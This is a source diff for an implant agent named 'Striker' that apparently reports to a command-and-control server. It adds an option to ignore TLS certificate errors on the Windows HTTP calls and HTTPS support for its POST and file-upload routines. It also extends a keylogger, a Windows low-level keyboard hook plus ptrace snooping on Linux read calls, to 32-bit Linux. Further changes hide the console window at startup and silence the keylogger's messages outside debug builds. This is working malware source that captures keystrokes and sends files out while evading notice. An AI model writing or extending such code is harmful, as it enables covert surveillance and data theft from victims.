@@ -43,6 +43,11 @@
 #ifdef IS_WINDOWS
   // Max file upload size
   #define MAX_UPLOAD_SIZE (1024 * 100000)
+  #ifdef INSECURE_SSL
+    #define STRIKER_WININET_OPTIONS INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+  #else
+    #define STRIKER_WININET_OPTIONS INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE
+  #endif
 #endif
 
 // Markers for the agent builder.
@@ -202,7 +207,7 @@ int http_get(char *url, buffer *body){
     return rsp_code;
   #else
     HINTERNET hInternet = InternetOpenA(STRIKER_USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    HINTERNET hResponse = InternetOpenUrlA(hInternet, target_url, "", 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    HINTERNET hResponse = InternetOpenUrlA(hInternet, target_url, "", 0, STRIKER_WININET_OPTIONS, 0);
     free(target_url);
     if (!hResponse){
       InternetCloseHandle(hInternet);
@@ -287,10 +292,14 @@ int http_post(char *url, cJSON *data, buffer *body){
     char *postData = cJSON_PrintUnformatted(data);
     HINTERNET hInternet = InternetOpenA(STRIKER_USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     HINTERNET hConnect = InternetConnect(hInternet, urlHost, urlPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-    HINTERNET hRequest = HttpOpenRequestA(hConnect, strs[1], urlPath, NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    HINTERNET hRequest;
+    if (urlProto == HTTPS)
+      hRequest = HttpOpenRequestA(hConnect, strs[1], urlPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE | STRIKER_WININET_OPTIONS, 0);
+    else
+      hRequest = HttpOpenRequestA(hConnect, strs[1], urlPath, NULL, NULL, NULL, STRIKER_WININET_OPTIONS, 0);      
     if (!HttpSendRequestA(hRequest, strs[0], strlen(strs[0]), postData, strlen(postData))){
       #ifdef STRIKER_DEBUG
-      fprintf(stderr, "[-] Error making POST request to: %s\n", target_url);
+      fprintf(stderr, "[-] Error making POST request to (%ld) : %s\n", GetLastError(), target_url);
       #endif
       goto end;
     }
@@ -350,7 +359,7 @@ int web_download(char *url, FILE *wfo){
     return (res != CURLE_OK);
   #else
     HINTERNET hInternet = InternetOpenA(STRIKER_USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    HINTERNET hResponse = InternetOpenUrlA(hInternet, url, "", 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    HINTERNET hResponse = InternetOpenUrlA(hInternet, url, "", 0, STRIKER_WININET_OPTIONS, 0);
     if (!hResponse){
       InternetCloseHandle(hInternet);
       return 1;
@@ -465,7 +474,11 @@ short int upload_file(char *url, char *filename, size_t file_size, FILE *rfo, bu
     parse_url(url, &proto, urlHost, &urlPort, urlPath);
     HINTERNET hInternet = InternetOpenA(STRIKER_USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     HINTERNET hConnect = InternetConnect(hInternet, urlHost, urlPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath, NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    HINTERNET hRequest;
+    if (proto == HTTPS)
+      hRequest = HttpOpenRequestA(hConnect, "POST", urlPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE | STRIKER_WININET_OPTIONS, 0);
+    else
+      hRequest = HttpOpenRequestA(hConnect, "POST", urlPath, NULL, NULL, NULL, STRIKER_WININET_OPTIONS, 0);
 
     char *formDataPrefix = malloc(1024);
     strncpy(formDataPrefix, "--", 1024);
@@ -607,7 +620,9 @@ void keymon(session *striker, task *tsk){
     }else{
       while (!(striker->abort || tsk->abort || keymon_keystrokes_count >= KEYMON_MAX_KEYSTROKES || time(NULL) >= end_time))
         sleep(1);
-      printf("Killing keyboard hook...\n");
+      #ifdef STRIKER_DEBUG
+      printf("[*] keymon: killing keyboard hook...\n");
+      #endif
       TerminateThread(tHandle, 0);
       sleep(1);
       if (keymon_keystrokes_count > 0){      
@@ -742,6 +757,7 @@ void keymon(session *striker, task *tsk){
       if (WIFEXITED(status))
         break;
       ptrace(PTRACE_GETREGS, *pid, 0, &regs);
+      #ifdef __x86_64__
       if (regs.orig_rax == 0 && regs.rdi == 0){
         unsigned char *val = malloc(sizeof(unsigned char));
         *val = (unsigned char)ptrace(PTRACE_PEEKDATA, *pid, regs.rsi, 0);
@@ -750,6 +766,16 @@ void keymon(session *striker, task *tsk){
         else
           free(val);
       }
+      #else
+      if (regs.orig_eax == 0 && regs.edi == 0){
+        unsigned char *val = malloc(sizeof(unsigned char));
+        *val = (unsigned char)ptrace(PTRACE_PEEKDATA, *pid, regs.esi, 0);
+        if (*val != 0)
+          queue_put(q, val);
+        else
+          free(val);
+      }      
+      #endif
     }
     complete:
       ptrace(PTRACE_DETACH, *pid, NULL, NULL);
@@ -758,16 +784,19 @@ void keymon(session *striker, task *tsk){
 #else
   DWORD WINAPI keymon_create_hook(LPVOID ptr){
 
-    printf("Creating hook...\n");
     //Retrieve the applications instance
     HINSTANCE hInstance = GetModuleHandle(NULL);
     //Set a global Windows Hook to capture keystrokes using the function declared above
     HHOOK kbHook = SetWindowsHookEx(WH_KEYBOARD_LL, keymon_hook_proc, hInstance, 0);
     if (!kbHook){
-      printf("Failed to hook!\n");
+      #ifdef STRIKER_DEBUG
+      printf("[-] keymon: unable to hook keyboard!\n");
+      #endif
       return 0;
     }
-    printf("Hook created!\n");
+    #ifdef STRIKER_DEBUG
+    printf("[+] keymon: keyboard hooked!\n");
+    #endif
     MSG Msg;
     while (GetMessage(&Msg, NULL, 0, 0) > 0){
       TranslateMessage(&Msg);
@@ -785,14 +814,16 @@ void keymon(session *striker, task *tsk){
       return CallNextHookEx(NULL, nCode, wParam, lParam);
     }
     short result = (short)pressedKey;
-    if (GetKeyState(VK_CAPITAL) & 0x1)
+    if (GetKeyState(VK_CAPITAL) & 0x1) // Caps lock key is toggled?
       result = result ^ 0x8000;
-    if (GetKeyState(VK_LSHIFT) & 0x8000)
+    if (GetKeyState(VK_LSHIFT) & 0x8000) // Left shift key is held?
       result = result ^ 0x4000;
-    if (GetKeyState(VK_RSHIFT) & 0x8000)
+    if (GetKeyState(VK_RSHIFT) & 0x8000) // Right shift key is held?
       result = result ^ 0x4000;
-    if (keymon_keystrokes != NULL && keymon_keystrokes_count < KEYMON_MAX_KEYSTROKES){    
-      printf("Caps: %d   Shift: %d   Val: %c\n", (result & 0x8000) != 0, (result & 0x4000) != 0, result & 0xff);
+    if (keymon_keystrokes != NULL && keymon_keystrokes_count < KEYMON_MAX_KEYSTROKES){
+      #ifdef STRIKER_DEBUG
+      printf("[+] keymon: caps: %d  shift: %d  val: %d\n", (result & 0x8000) != 0, (result & 0x4000) != 0, result & 0xff);
+      #endif
       *(keymon_keystrokes + (sizeof(short) * keymon_keystrokes_count)) = result;
       keymon_keystrokes_count += 1;
     }
@@ -1895,6 +1926,9 @@ int main(int argc, char **argv){
     start_session();
     curl_global_cleanup();
   #else
+    HWND hWnd = GetConsoleWindow();
+    ShowWindow(hWnd, SW_MINIMIZE);
+    ShowWindow(hWnd, SW_HIDE);
     start_session();
   #endif
   return 0;
